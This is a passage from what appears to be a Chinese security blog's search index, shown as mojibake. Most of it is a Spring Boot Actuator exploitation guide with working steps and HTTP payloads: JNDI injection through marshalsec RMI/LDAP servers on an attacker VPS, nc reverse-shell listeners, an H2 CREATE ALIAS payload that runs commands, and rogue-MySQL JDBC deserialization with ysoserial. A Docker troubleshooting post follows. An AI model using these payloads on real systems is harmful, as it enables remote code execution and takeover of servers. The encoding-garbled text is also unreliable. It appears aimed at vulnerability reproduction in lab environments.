¹ç›®å½•ã€‚æ­¥éª¤å››ï¼šæ¶è®¾æ¶æ„rmiæœåŠ¡ä¸‹è½½marshalsecï¼Œä½¿ç”¨ä¸‹é¢å‘½ä»¤æ¶è®¾å¯¹åº”çš„rmiæœåŠ¡ï¼šjava-cpmarshalsec-0.0.3-SNAPSHOT-all.jarmarshalsec.jndi.RMIRefServerhttp://your-vps-ip:80/#JNDIObject1389æ­¥éª¤äº”ï¼šç›‘å¬åå¼¹shellçš„ç«¯å£ä¸€èˆ¬ä½¿ç”¨ncç›‘å¬ç«¯å£ï¼Œç­‰å¾…åå¼¹shellnc-lvp443æ­¥éª¤å…­ï¼šå‘é€æ¶æ„payloadæ ¹æ®å®é™…æƒ…å†µä¿®æ”¹springboot-realm-jndi-rce.pyè„šæœ¬ä¸­çš„ç›®æ ‡åœ°å€ï¼ŒRMIåœ°å€ã€ç«¯å£ç­‰ä¿¡æ¯ï¼Œç„¶ååœ¨è‡ªå·±æ§åˆ¶çš„æœåŠ¡å™¨ä¸Šè¿è¡Œã€‚æ¼æ´åŸç†ï¼šåˆ©ç”¨jolokiaè°ƒç”¨createJNDIRealmåˆ›å»ºJNDIRealmè®¾ç½®connectionURLåœ°å€ä¸ºRMIServiceURLè®¾ç½®contextFactoryä¸ºRegistryContextFactoryåœæ­¢Realmå¯åŠ¨Realmä»¥è§¦å‘æŒ‡å®šRMIåœ°å€çš„JNDIæ³¨å…¥ï¼Œé€ æˆRCEæ¼æ´æ¼æ´åˆ†æï¼šâ€‹\tYetAnotherWaytoExploitSpringBootActuatorsviaJolokiaæ¼æ´ç¯å¢ƒï¼šrepository/springboot-jolokia-logback-rceæ­£å¸¸è®¿é—®ï¼šhttp://127.0.0.1:9094/env0x06ï¼šh2databasequeryRCEåˆ©ç”¨æ¡ä»¶ï¼šå¯ä»¥POSTè¯·æ±‚ç›®æ ‡ç½‘ç«™çš„/envæ¥å£è®¾ç½®å±æ€§å¯ä»¥POSTè¯·æ±‚ç›®æ ‡ç½‘ç«™çš„/restartæ¥å£é‡å¯åº”ç”¨ï¼ˆå­˜åœ¨spring-boot-starter-actuatorä¾èµ–ï¼‰å­˜åœ¨com.h2database.h2ä¾èµ–ï¼ˆç‰ˆæœ¬è¦æ±‚æš‚æœªçŸ¥ï¼‰åˆ©ç”¨æ–¹æ³•ï¼šæ­¥éª¤ä¸€ï¼šè®¾ç½®spring.datasource.hikari.connection-test-queryå±æ€§âš ï¸ä¸‹é¢payloadä¸­çš„â€˜T5â€™æ–¹æ³•æ¯ä¸€æ¬¡æ‰§è¡Œå‘½ä»¤åéƒ½éœ€è¦æ›´æ¢åç§°(å¦‚T6)ï¼Œç„¶åæ‰èƒ½è¢«é‡æ–°åˆ›å»ºä½¿ç”¨ï¼Œå¦åˆ™ä¸‹æ¬¡restarté‡å¯åº”ç”¨æ—¶æ¼æ´ä¸ä¼šè¢«è§¦å‘spring1.xï¼ˆæ— å›æ˜¾æ‰§è¡Œå‘½ä»¤ï¼‰POST/envContent-Type:application/x-www-form-urlencodedspring.datasource.hikari.connection-test-query=CREATEALIAST5ASCONCAT('voidex(Stringm1,Stringm2,Stringm3)throwsException{Runti','me.getRun','time().exe','c(newString[]{m1,m2,m3});}');CALLT5('cmd','/c','calc');spring2.xï¼ˆæ— å›æ˜¾æ‰§è¡Œå‘½ä»¤ï¼‰POST/actuator/envContent-Type:application/json{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATEALIAST5ASCONCAT('voidex(Stringm1,Stringm2,Stringm3)throwsException{Runti','me.getRun','time().exe','c(newString[]{m1,m2,m3});}');CALLT5('cmd','/c','calc');\"}æ­¥éª¤äºŒï¼šé‡å¯åº”ç”¨spring1.xPOST/restartContent-Type:application/x-www-form-urlencodedspring2.xPOST/actuator/restartContent-Type:application/jsonæ¼æ´åŸç†ï¼šspring.datasource.hikari.connection-test-queryå±æ€§è¢«è®¾ç½®ä¸ºä¸€æ¡æ¶æ„çš„CREATEALIASåˆ›å»ºè‡ªå®šä¹‰å‡½æ•°çš„SQLè¯­å¥å…¶å±æ€§å¯¹åº”HikariCPæ•°æ®åº“è¿æ¥æ± çš„connectionTestQueryé…ç½®ï¼Œå®šä¹‰ä¸€ä¸ªæ–°æ•°æ®åº“è¿æ¥ä¹‹å‰è¢«æ‰§è¡Œçš„SQLè¯­å¥restarté‡å¯åº”ç”¨ï¼Œä¼šå»ºç«‹æ–°çš„æ•°æ®åº“è¿æ¥å¦‚æœSQLè¯­å¥ä¸­çš„è‡ªå®šä¹‰å‡½æ•°è¿˜æ²¡æœ‰è¢«æ‰§è¡Œè¿‡ï¼Œé‚£ä¹ˆè‡ªå®šä¹‰å‡½æ•°å°±ä¼šè¢«æ‰§è¡Œï¼Œé€ æˆRCEæ¼æ´æ¼æ´åˆ†æï¼šâ€‹\tremote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-databaseæ¼æ´ç¯å¢ƒï¼šrepository/springboot-h2-database-rceæ­£å¸¸è®¿é—®ï¼šhttp://127.0.0.1:9096/actuator/env0x07ï¼šh2databaseconsoleJNDIRCEåˆ©ç”¨æ¡ä»¶ï¼šå­˜åœ¨com.h2database.h2ä¾èµ–ï¼ˆç‰ˆæœ¬è¦æ±‚æš‚æœªçŸ¥ï¼‰springé…ç½®ä¸­å¯ç”¨h2consolespring.h2.console.enabled=trueç›®æ ‡å¯ä»¥è¯·æ±‚æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼ˆè¯·æ±‚å¯å‡ºå¤–ç½‘ï¼‰JNDIæ³¨å…¥å—ç›®æ ‡JDKç‰ˆæœ¬å½±å“ï¼Œjdk&lt;6u201/7u191/8u182/11.0.1ï¼ˆLDAPæ–¹å¼ï¼‰åˆ©ç”¨æ–¹æ³•ï¼šæ­¥éª¤ä¸€ï¼šè®¿é—®è·¯ç”±è·å¾—jsessionidç›´æ¥è®¿é—®ç›®æ ‡å¼€å¯h2consoleçš„é»˜è®¤è·¯ç”±/h2-consoleï¼Œç›®æ ‡ä¼šè·³è½¬åˆ°é¡µé¢/h2-console/login.jsp?jsessionid=xxxxxxï¼Œè®°å½•ä¸‹å®é™…çš„jsessionid=xxxxxxå€¼ã€‚æ­¥éª¤äºŒï¼šå‡†å¤‡è¦æ‰§è¡Œçš„Javaä»£ç ç¼–å†™ä¼˜åŒ–è¿‡åçš„ç”¨æ¥åå¼¹shellçš„Javaç¤ºä¾‹ä»£ç JNDIObject.javaï¼Œä½¿ç”¨å…¼å®¹ä½ç‰ˆæœ¬jdkçš„æ–¹å¼ç¼–è¯‘ï¼šjavac-source1.5-target1.5JNDIObject.javaç„¶åå°†ç”Ÿæˆçš„JNDIObject.classæ–‡ä»¶æ‹·è´åˆ°æ­¥éª¤äºŒä¸­çš„ç½‘ç«™æ ¹ç›®å½•ã€‚æ­¥éª¤ä¸‰ï¼šæ‰˜ç®¡classæ–‡ä»¶åœ¨è‡ªå·±æ§åˆ¶çš„vpsæœºå™¨ä¸Šå¼€å¯ä¸€ä¸ªç®€å•HTTPæœåŠ¡å™¨ï¼Œç«¯å£å°½é‡ä½¿ç”¨å¸¸è§HTTPæœåŠ¡ç«¯å£ï¼ˆ80ã€443ï¼‰#ä½¿ç”¨pythonå¿«é€Ÿå¼€å¯httpserverpython2-mSimpleHTTPServer80python3-mhttp.server80å°†æ­¥éª¤äºŒä¸­ç¼–è¯‘å¥½çš„classæ–‡ä»¶æ‹·è´åˆ°HTTPæœåŠ¡å™¨æ ¹ç›®å½•ã€‚æ­¥éª¤å››ï¼šæ¶è®¾æ¶æ„ldapæœåŠ¡ä¸‹è½½marshalsecï¼Œä½¿ç”¨ä¸‹é¢å‘½ä»¤æ¶è®¾å¯¹åº”çš„ldapæœåŠ¡ï¼šjava-cpmarshalsec-0.0.3-SNAPSHOT-all.jarmarshalsec.jndi.LDAPRefServerhttp://your-vps-ip:80/#JNDIObject1389æ­¥éª¤äº”ï¼šç›‘å¬åå¼¹shellçš„ç«¯å£ä¸€èˆ¬ä½¿ç”¨ncç›‘å¬ç«¯å£ï¼Œç­‰å¾…åå¼¹shellnc-lv443æ­¥éª¤å…­ï¼šå‘åŒ…è§¦å‘JNDIæ³¨å…¥æ ¹æ®å®é™…æƒ…å†µï¼Œæ›¿æ¢ä¸‹é¢æ•°æ®ä¸­çš„jsessionid=xxxxxxã€www.example.comå’Œldap://your-vps-ip:1389/JNDIObjectPOST/h2-console/login.do?jsessionid=xxxxxxHost:www.example.comContent-Type:application/x-www-form-urlencodedReferer:http://www.example.com/h2-console/login.jsp?jsessionid=xxxxxxlanguage=en&amp;setting=Generic+H2+%28Embedded%29&amp;name=Generic+H2+%28Embedded%29&amp;driver=javax.naming.InitialContext&amp;url=ldap://your-vps-ip:1389/JNDIObject&amp;user=&amp;password=æ¼æ´åˆ†æï¼šâ€‹\tSpringBoot+H2æ•°æ®åº“JNDIæ³¨å…¥æ¼æ´ç¯å¢ƒï¼šrepository/springboot-h2-database-rceæ­£å¸¸è®¿é—®ï¼šhttp://127.0.0.1:9096/h2-console0x08ï¼šmysqljdbcdeserializationRCEåˆ©ç”¨æ¡ä»¶ï¼šå¯ä»¥POSTè¯·æ±‚ç›®æ ‡ç½‘ç«™çš„/envæ¥å£è®¾ç½®å±æ€§å¯ä»¥POSTè¯·æ±‚ç›®æ ‡ç½‘ç«™çš„/refreshæ¥å£åˆ·æ–°é…ç½®ï¼ˆå­˜åœ¨spring-boot-starter-actuatorä¾èµ–ï¼‰ç›®æ ‡ç¯å¢ƒä¸­å­˜åœ¨mysql-connector-javaä¾èµ–ç›®æ ‡å¯ä»¥è¯·æ±‚æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼ˆè¯·æ±‚å¯å‡ºå¤–ç½‘ï¼‰åˆ©ç”¨æ–¹æ³•ï¼šæ­¥éª¤ä¸€ï¼šæŸ¥çœ‹ç¯å¢ƒä¾èµ–GETè¯·æ±‚/envæˆ–/actuator/envï¼Œæœç´¢ç¯å¢ƒå˜é‡ï¼ˆclasspathï¼‰ä¸­æ˜¯å¦æœ‰mysql-connector-javaå…³é”®è¯ï¼Œå¹¶è®°å½•ä¸‹å…¶ç‰ˆæœ¬å·ï¼ˆ5.xæˆ–8.xï¼‰ï¼›æœç´¢å¹¶è§‚å¯Ÿç¯å¢ƒå˜é‡ä¸­æ˜¯å¦å­˜åœ¨å¸¸è§çš„ååºåˆ—åŒ–gadgetä¾èµ–ï¼Œæ¯”å¦‚commons-collectionsã€Jdk7u21ã€Jdk8u20ç­‰ï¼›æœç´¢spring.datasource.urlå…³é”®è¯ï¼Œè®°å½•ä¸‹å…¶valueå€¼ï¼Œæ–¹ä¾¿åç»­æ¢å¤å…¶æ­£å¸¸jdbcurlå€¼ã€‚æ­¥éª¤äºŒï¼šæ¶è®¾æ¶æ„roguemysqlserveråœ¨è‡ªå·±æ§åˆ¶çš„æœåŠ¡å™¨ä¸Šè¿è¡Œspringboot-jdbc-deserialization-rce.pyè„šæœ¬ï¼Œå¹¶ä½¿ç”¨ysoserialè‡ªå®šä¹‰è¦æ‰§è¡Œçš„å‘½ä»¤ï¼šjava-jarysoserial.jarCommonsCollections3calc&gt;payload.seråœ¨è„šæœ¬åŒç›®å½•ä¸‹ç”Ÿæˆpayload.serååºåˆ—åŒ–payloadæ–‡ä»¶ï¼Œä¾›è„šæœ¬ä½¿ç”¨ã€‚æ­¥éª¤ä¸‰ï¼šè®¾ç½®spring.datasource.urlå±æ€§âš ï¸ä¿®æ”¹æ­¤å±æ€§ä¼šæš‚æ—¶å¯¼è‡´ç½‘ç«™æ‰€æœ‰çš„æ­£å¸¸æ•°æ®åº“æœåŠ¡ä¸å¯ç”¨ï¼Œä¼šå¯¹ä¸šåŠ¡é€ æˆå½±å“ï¼Œè¯·è°¨æ…æ“ä½œï¼mysql-connector-java5.xç‰ˆæœ¬è®¾ç½®å±æ€§å€¼ä¸ºï¼šjdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=truemysql-connector-java8.xç‰ˆæœ¬è®¾ç½®å±æ€§å€¼ä¸ºï¼šjdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=truespring1.xPOST/envContent-Type:application/x-www-form-urlencodedspring.datasource.url=å¯¹åº”å±æ€§å€¼spring2.xPOST/actuator/envContent-Type:application/json{\"name\":\"spring.datasource.url\",\"value\":\"å¯¹åº”å±æ€§å€¼\"}æ­¥éª¤å››ï¼šåˆ·æ–°é…ç½®spring1.xPOST/refreshContent-Type:application/x-www-form-urlencodedspring2.xPOST/actuator/refreshContent-Type:application/jsonæ­¥éª¤äº”ï¼šè§¦å‘æ•°æ®åº“æŸ¥è¯¢å°è¯•è®¿é—®ç½‘ç«™å·²çŸ¥çš„æ•°æ®åº“æŸ¥è¯¢çš„æ¥å£ï¼Œä¾‹å¦‚ï¼š/product/listï¼Œæˆ–è€…å¯»æ‰¾å…¶ä»–æ–¹å¼ï¼Œä¸»åŠ¨è§¦å‘æºç½‘ç«™è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢ï¼Œç„¶åæ¼æ´ä¼šè¢«è§¦å‘æ­¥éª¤å…­ï¼šæ¢å¤æ­£å¸¸jdbcurlååºåˆ—åŒ–æ¼æ´åˆ©ç”¨å®Œæˆåï¼Œä½¿ç”¨æ­¥éª¤ä¸‰çš„æ–¹æ³•æ¢å¤æ­¥éª¤ä¸€ä¸­è®°å½•çš„spring.datasource.urlçš„åŸå§‹valueå€¼æ¼æ´åŸç†ï¼šspring.datasource.urlå±æ€§è¢«è®¾ç½®ä¸ºå¤–éƒ¨æ¶æ„mysqljdbcurlåœ°å€refreshåˆ·æ–°åè®¾ç½®äº†ä¸€ä¸ªæ–°çš„spring.datasource.urlå±æ€§å€¼å½“ç½‘ç«™è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢ç­‰æ“ä½œæ—¶ï¼Œä¼šå°è¯•ä½¿ç”¨æ¶æ„mysqljdbcurlå»ºç«‹æ–°çš„æ•°æ®åº“è¿æ¥ç„¶åæ¶æ„mysqlserverå°±ä¼šåœ¨å»ºç«‹è¿æ¥çš„åˆé€‚é˜¶æ®µè¿”å›ååºåˆ—åŒ–payloadæ•°æ®ç›®æ ‡ä¾èµ–çš„mysql-connector-javaå°±ä¼šååºåˆ—åŒ–è®¾ç½®å¥½çš„gadgetï¼Œé€ æˆRCEæ¼æ´æ¼æ´åˆ†æï¼šâ€‹\tNew-Exploit-Technique-In-Java-Deserialization-Attackæ¼æ´ç¯å¢ƒï¼šéœ€è¦é…ç½®application.propertiesä¸­çš„spring.datasource.urlã€spring.datasource.usernameã€spring.datasource.passwordï¼Œä¿è¯å¯ä»¥æ­£å¸¸è¿ä¸Šmysqlæ•°æ®åº“ï¼Œå¦åˆ™ç¨‹åºå¯åŠ¨æ—¶å°±ä¼šæŠ¥é”™é€€å‡ºrepository/springboot-mysql-jdbc-rceæ­£å¸¸è®¿é—®ï¼šhttp://127.0.0.1:9097/actuator/envå‘é€å®Œpayloadåè§¦å‘æ¼æ´ï¼šhttp://127.0.0.1:9097/product/list"
  },

  {
    "title"    : "ã€Œæ’é”™ã€ï¼šDockerå¯åŠ¨vulnhubæŠ¥é”™æ’é”™",
    "category" : "",
    "tags"     : "docker, æŠ€å·§, Vulnhub, ç¬”è®°",
    "url"      : "/blog/2020/docker/vuln/problems/",
    "date"     : "Sep 11, 2020",
    "content"  : "æœ€è¿‘åœ¨åšé¶åœºæ¼æ´å¤ç°çš„æ—¶å€™å‘ç°äº†ä¸€ä¸ªç”±webè™šæ‹Ÿæœºå’Œdbè™šæ‹Ÿæœºä¸€èµ·è·‘èµ·æ¥çš„è”åŠ¨é¶åœºç¯å¢ƒï¼Œä¸‹è½½å®Œé•œåƒåæ€»æ˜¯æŠ¥é”™ï¼Œæ€å‰æƒ³åéƒ½æ²¡åŠæ³•ï¼Œäºæ˜¯åªèƒ½è‡ªå·±æ¥è§£å†³é—®é¢˜ï¼Œè™½ç„¶ç»“æœä»¤äººå¤§å¤±æ‰€æœ›ï¼Œä½†æ˜¯è¿‡ç¨‹è¿˜æ˜¯æŒºè®©äººæœ‰æˆå°±æ„Ÿçš„ï¼Œå°±è®°å½•äº†ä¸€ä¸‹ã€‚#dockerå¯æœåŠ¡è¿›å…¥ç›¸å¯¹åº”çš„é¶åœºç¯å¢ƒæ–‡ä»¶å¤¹ä¸‹èµ·é¶åœºï¼šbin4xin@bin4xin'sMacbookProCVE-2020-9402%docker-composeup-dCreatingnetwork\"cve-2020-9402_default\"withthedefaultdriverCreatingcve-2020-9402_db_1...doneCreatingcve-2020-9402_web_1...donebin4xin@bin4xin'sMacbookProCVE-2020-9402%docker-composepsNameCommandStatePorts-------------------------------------------------------------------------------------------cve-2020-9402_db_1/entrypoint.shUp1521/tcp,5500/tcp,8080/tcpcve-2020-9402_web_1/docker-entrypoint.shpyth...Up0.0.0.0:8000-&gt;8000/tcpæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¯¹åº”webæœåŠ¡çš„ç«¯å£ç›‘å¬çŠ¶æ€ï¼š0.0.0.0:8000-&gt;8000/tcpï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥è®¿é—®è¯•è¯•çœ‹ï¼šbin4xin@bin4xin'sMacbookProCVE-2020-9402%curllocalhost:8000curl:(52)Emptyreplyfromserverbin4xin@bin4xin'sMacbookProCVE-2020-9402%docker-composepsNameCommandStatePorts-------------------------------------------------------------------------------------------cve-2020-9402_db_1/entrypoint.shUp1521/tcp,5500/tcp,8080/tcpcve-2020-9402_web_1/docker-entrypoint.shpyth...Up0.0.0.0:8000-&gt;8000/tcpbin4xin@bin4xin'sMacbookProCVE-2020-9402%curl127.0.0.1:8000/vulncurl:(52)Emptyreplyfromserverbin4xin@bin4xin'sMacbookProCVE-2020-9402%docker-composepsNameCommandStatePorts-------------------------------------------------------------------------------------------cve-2020-9402_db_1/entrypoint.shUp1521/tcp,5500/tcp,8080/tcpcve-2020-9402_web_1/docker-entrypoint.shpyth...Up0.0.0.0:8000-&gt;8000/tcpåœ¨ä¸Šé¢çš„bashç»ˆç«¯ä»£ç æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬è®¿é—®8000ç«¯å£æœåŠ¡ï¼Œéƒ½æ˜¯è¿”å›Emptyreplyfromserverï¼Œæˆ‘å°±å¾ˆéƒé—·äº†ï¼Œæ˜æ˜dockeræ˜¾ç¤ºçŠ¶æ€æ˜¯UpçŠ¶æ€ï¼Œæ€ä¹ˆè®¿é—®æ—¶æœåŠ¡è¿”å›ç©ºå‘¢ã€‚#æ’é”™#è¿™æ˜¯ä¸€ä¸ªæœ‰è„¾æ°”çš„å®¹å™¨è¿˜æ˜¯ä¸ç”˜å¿ƒï¼Œçœ‹äº†ä¸€ä¸‹æœ¬åœ°çš„ipåœ°å€ï¼Œå†æ¬¡è®¿é—®çœ‹çœ‹ï¼šbin4xin@bin4xin'sMacbookProshiro%ifconfig|grepinet\tinet127.0.0.1netmask0xff000000\tinet6::1prefixlen128\tinet6fe80::1%lo0prefixlen64scopeid0x1\tinet6fe80::aede:48ff:fe00:1122%en5prefixlen64scopeid0x7\tinet6fe80::146d:ed67:817a:e134%en0prefixlen64securedscopeid0x9\tinet114.97.221.67netmask0xfffffe00broadcast114.97.221.255\tinet6fe80::24e6:3dff:fe1c:7c55%awdl0prefixlen64scopeid0x10\tinet6fe80::24e6:3dff:fe1c:7c55%llw0prefixlen64scopeid0x11\tinet6fe80::9a9a:9906:8f8d:5e0%utun0prefixlen64scopeid0x12\tinet6fe80::8ef2:d44b:f2b0:f37e%utun1prefixlen64scopeid0x13en0:flags=8863&lt;UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST&gt;mtu1500\tinet114.97.221.67bin4xin@bin4xin'sMacbookProshiro%curlhttp://114.97.221.67:8000/vulncurl:(7)Failedtoconnectto114.97.221.67port8000:Connectionrefusedbin4xin@bin4xin'sMacbookProshiro%docker-composepsNameCommandStatePorts------------------------------------------------------------------------------------------------cve-2020-9402_db_1/entrypoint.shUp1521/tcp,5500/tcp,8080/tcpcve-2020-9402_web_1/docker-entrypoint.shpyth...Restartingå¥½å®¶ä¼™ï¼Œè¿™æ¬¡ç›´æ¥webæœåŠ¡é‡å¯äº†ï¼Œæœ‰è„¾æ°”ã€‚æ²¡åŠæ³•ï¼Œç›´æ¥æŠŠæ•´ä¸ªç¯å¢ƒdownæ‰é‡å¯ã€‚#è¿›å®¹å™¨è¿™æ¬¡æˆ‘æƒ³åˆ°çš„åŠæ³•æ˜¯ç›´æ¥è¿›å®¹å™¨é‡Œé¢å»çœ‹çœ‹æœåŠ¡åˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆï¼šdockerpsa66976bc6d2bcve-2020-9402_web\"/docker-entrypoint.â€¦\"4secondsagoUp3seconds0.0.0.0:8000-&gt;8000/tcpcve-2020-9402_web_1fc99758ce428vulhub/oracle:12c-ee\"/entrypoint.sh\"5secondsagoUp3seconds1521/tcp,5500/tcp,8080/tcpcve-2020-9402_db_1æˆ‘ä»¬å¯ä»¥é€šè¿‡dockerpsæ¥æŸ¥çœ‹dockeré•œåƒcve-2020-9402_webå¯¹åº”çš„CONTAINERIDï¼Œé€šè¿‡è¿™ä¸ªidå€¼è¿›å…¥å®¹å™¨ï¼›bin4xin@bin4xin'sMacbookProCVE-2020-9402%sudodockerexec-ita66976bc6d2b/bin/bashroot@a66976bc6d2b:/usr/src#root@a66976bc6d2b:/usr/src#ps-efUIDPIDPPIDCSTIMETTYTIMECMDroot10006:44?00:00:00/bin/bash/docker-entrypoint.shpythonmanage.pyrunserver0.0.0.0:8000root71006:44?00:00:00bash/usr/local/bin/wait-for-it.sh-t0db:1521--echooracleisuproot560006:45pts/000:00:00/bin/bashroot737006:45?00:00:00sleep1root7456006:45pts/000:00:00ps-efçœ‹äº†ä¸€ä¸‹ï¼Œæ²¡ä»€ä¹ˆå¤§é—®é¢˜å•Šï¼ŒæœåŠ¡è¯¥ç…§å¸¸å¯åŠ¨çš„éƒ½å¯åŠ¨äº†ï¼Œéš¾é“æ˜¯dbæœåŠ¡çš„é—®é¢˜ï¼Ÿå°±åœ¨æˆ‘ç–‘æƒ‘çš„æ—¶å€™ï¼Œæœç„¶ï¼šå®¹å™¨åˆé‡å¯äº†ï¼Œæˆ‘çš„shellç›´æ¥æ‰äº†ï¼ŒæŸ¥çœ‹ä¸€ä¸‹çŠ¶æ€ï¼Œå¯ä¸å’‹åœ°ï¼Œåˆrestartäº†ï¼Œå¿ƒé‡Œè‹¦é˜¿ã€‚bin4xin@bin4xin'sMacbookProCVE-2020-9402%dockerpsCONTAINERIDIMAGECOMMANDCREATEDSTATUSPORTSNAMESa66976bc6d2bcve-2020-9402_web\"/docker-entrypoint.â€¦\"2minutesagoRestarting(1)2secondsago#æ—¥å¿—æ’é”™:-)æ’é”™ä¹‹å‰çœ‹ä¸€ä¸‹dockerçš„æ‰“å°æ—¥å¿—æŒ‡å—%dockerlogs--helpUsage:dockerlogs[OPTIONS]CONTAINERFetchthelogsofacontainerOptions:--detailsShowextradetailsprovidedtologs-f,--followFollowlogoutput--sincestringShowlogssincetimestamp(e.g.2013-01-02T13:23:37)orrelative(e.g.42mfor42minutes)--tailstringNumberoflinestoshowfromtheendofthelogs(default\"all\")-t,--timestampsShowtimestamps--untilstringShowlogsbeforeatimestamp(e.g.2013-01-02T13:23:37)orrelative(e.g.42mfor42minutes)æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œfå‚æ•°å¯¹åº”çš„æ˜¯logæŸ¥çœ‹çš„å®¹å™¨idï¼Œè€Œæˆ‘çš„éœ€æ±‚æ˜¯ï¼Œå¯¹åº”æŸ¥çœ‹æŸä¸€ä¸ªæ—¶é—´æ®µä¹‹åçš„dbè™šæ‹Ÿæœºçš„æ—¥å¿—ï¼Œæ‰€ä»¥ç”Ÿæˆå‘½ä»¤ï¼šdockerlogs--since2020-09-11T14:50:00-fb5731d06d3eawebçš„æ—¥å¿—:bin4xin@bin4xin'sMacbookProshiro%dockerlogs--since2020-09-11T14:40:00-fae715c332e7e+cd/usr/src+wait-for-it.sh-t0db:1521--echo'oracleisup'wait-for-it.sh:waitingfordb:1521withoutatimeoutwait-for-it.sh:db:1521isavailableafter60secondsoracleisupæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ²¡æœ‰ä»»ä½•æŠ¥é”™ï¼›ç»§ç»­ï¼Œçœ‹ä¸‹é¢çš„æŠ¥é”™ï¼š+pythonmanage.pymakemigrationsTraceback(mostrecentcalllast):File\"/usr/local/lib/python3.6/site-packages/django/db/backends/base/base.py\",line220,inensure_connectionself.connect()File\"/usr/local/lib/python3.6/site-packages/django/utils/asyncio.py\",line26,ininnerreturnfunc(*args,**kwargs)File\"/usr/local/lib/python3.6/site-packages/django/db/backends/base/base.py\",line197,inconnectself.connection=self.get_new_connection(conn_params)File\"/usr/local/lib/python3.6/site-packages/django/utils/asyncio.py\",line26,ininnerreturnfunc(*args,**kwargs)File\"/usr/local/lib/python3.6/site-packages/django/db/backends/oracle/base.py\",line232,inget_new_connection**conn_params,cx_Oracle.DatabaseError:ORA-12505:TNS:listenerdoesnotcurrentlyknowofSIDgiveninconnectdescriptorTheaboveexceptionwasthedirectcauseofthefollowingexception:Traceback(mostrecentcalllast):File\"manage.py\",line21,in&lt;module&gt;main()Â·ä¸­é—´éƒ¨åˆ†çœç•¥Â·ä¸­é—´éƒ¨åˆ†çœç•¥Â·ä¸­é—´éƒ¨åˆ†çœç•¥**conn_params,django.db.utils.DatabaseError:ORA-12505:TNS:listenerdoesnotcurrentlyknowofSIDgiveninconnectdescriptoræŸ¥çœ‹æŠ¥é”™æ˜¯dbçš„æŠ¥é”™ï¼Œèµ¶ç´§çœ‹çœ‹dbè™šæ‹Ÿæœºçš„æ—¥å¿—æƒ…å†µdockerlogs--since2020-09-11T14:40:00-fb32b16e34b6cdbï¼šls:cannotaccess/u01/app/oracle/oradata/orcl:NosuchfileordirectoryNodatabasesfoundin/u01/app/oracle/oradata/orcl.AbouttocreateanewdatabaseinstanceStartingdatabaselistenerLSNRCTLforLinux:Version12.1.0.2.0-Productionon11-SEP-202006:54:05Copyright(c)1991,2014,Oracle.Allrightsreserved.Starting/u01/app/oracle/product/12.1.0.2/dbhome_1/bin/tnslsnr:pleasewait...TNSLSNRforLinux:Version12.1.0.2.0-ProductionSystemparameterfileis/u01/app/oracle/product/12.1.0.2/dbhome_1/network/admin/listener.oraLogmessageswrittento/u01/app/oracle/diag/tnslsnr/b32b16e34b6c/listener/alert/log.xmlListeningon:(DESCRIPTION=(ADDRESS=(PROTOCOL=tcp)(HOST=b32b16e34b6c)(PORT=1521)))Connectingto(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=b32b16e34b6c)(PORT=1521)))STATUSoftheLISTENER------------------------AliasLISTENERVersionTNSLSNRforLinux:Version12.1.0.2.0-ProductionStartDate11-SEP-202006:54:05Uptime0days0hr.0min.0secTraceLeveloffSecurityON:LocalOSAuthenticationSNMPOFFListenerParameterFile/u01/app/oracle/product/12.1.0.2/dbhome_1/network/admin/listener.oraListenerLogFile/u01/app/oracle/diag/tnslsnr/b32b16e34b6c/listener/alert/log.xmlListeningEndpointsSummary...(DESCRIPTION=(ADDRESS=(PROTOCOL=tcp)(HOST=b32b16e34b6c)(PORT=1521)))ThelistenersupportsnoservicesThecommandcompletedsuccessfullyCopyingdatabasefiles1%complete3%complete11%complete18%completeæ•°æ®åº“æœåŠ¡ä¼¼ä¹å·²ç»å¯åŠ¨èµ·æ¥äº†ï¼Œä½†æ˜¯æ•°æ®åº“æ–‡ä»¶è¿˜åœ¨å¤åˆ¶è¿‡ç¨‹ä¸­ï¼šCopyingdatabasefilesï¼Œé‚£å°±ç­‰å¾…æ–‡ä»¶å¤åˆ¶å®Œæˆè¯•è¯•çœ‹æ˜¯ä¸æ˜¯å¤åˆ¶æ–‡ä»¶çš„è¡Œä¸ºã€‚100%completeLookatthelogfile\"/u01/app/oracle/cfgtoollogs/dbca/orcl/orcl.log\"forfurtherdetails.LSNRCTLforLinux:Version12.1.0.2.0-Productionon11-SEP-202007:00:33Copyright(c)1991,2014,Oracle.Allrightsreserved.Connectingto(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=b32b16e34b6c)(PORT=1521)))ThecommandcompletedsuccessfullyDatabasehasbeencreatedin/u01/app/oracle/oradata/orclSYSandSYSTEMpasswordsaresetto[oracle]SettingHTTPportto8080PL/SQLproceduresuccessfullycompleted.Pleaselogintohttp://&lt;ip_address&gt;:8080/emtouseenterprisemanagerUser:sys;Passwordoracle;Sysdba:trueFixingpermissions...Runninginitscripts...Initscriptsin/oracle.init.d/:Ignoring/oracle.init.d/*Donewithscriptswearereadytogoéš¾é“æ˜¯å› ä¸ºdbçš„åŸå› å¯¼è‡´webæœåŠ¡æŠ¥é”™ï¼Œè€Œä¸”æ°å¥½æŠ¥é”™æ˜¯oracleæ•°æ®åº“çš„é”™ï¼Œè€Œåˆæ°å¥½æˆ‘ä»¬çœ‹æ—¥å¿—æ—¶æ˜¯å­˜åœ¨è¿™æ 